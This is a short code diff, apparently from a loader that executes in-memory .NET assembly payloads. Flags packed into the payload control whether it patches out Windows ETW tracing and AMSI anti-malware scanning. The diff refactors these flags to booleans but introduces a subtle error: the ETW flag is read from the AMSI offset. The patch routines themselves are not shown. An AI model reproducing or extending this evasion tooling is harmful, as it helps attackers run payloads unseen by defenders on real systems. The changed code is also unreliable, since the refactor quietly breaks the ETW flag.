@@ -19,8 +19,8 @@
 #define MethodJittingStarted 145
 #define ILStubGenerated 88
 
-unsigned char amsiflag[1];
-unsigned char etwflag[1];
+bool amsiflag;
+bool etwflag;
 unsigned char signflag[1];
 
 char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
@@ -113,11 +113,11 @@ int executeSharp(LPVOID lpPayload)
 	//Taking pointer to amsi
 	unsigned char *offsetamsi = allData + 8;
 	//Store amsi flag 
-	memcpy(amsiflag, offsetamsi, 1);
+	amsiflag = (offsetamsi[0] != 0);
 
 	unsigned char *offsetetw = allData + 9;
-	//Store amsi flag 
-	memcpy(etwflag, offsetetw, 1);
+	//Store etw flag 
+	etwflag = (offsetamsi[0] != 0);
 
 	unsigned char *offsetsign = allData + 10;
 	//Store sihnature flag 
@@ -153,7 +153,7 @@ int executeSharp(LPVOID lpPayload)
 	}
 
 	//Etw bypass
-	if (etwflag[0] == '\x01')
+	if (etwflag)
 	{
 		int ptcResult = PatchEtw();
 		if (ptcResult == -1)
@@ -238,7 +238,7 @@ int executeSharp(LPVOID lpPayload)
 	}
 
 	//Amsi bypass
-	if (amsiflag[0] == '\x01')
+	if (amsiflag)
 	{
 		int ptcResult = PatchAmsi();
 		if (ptcResult == -1)
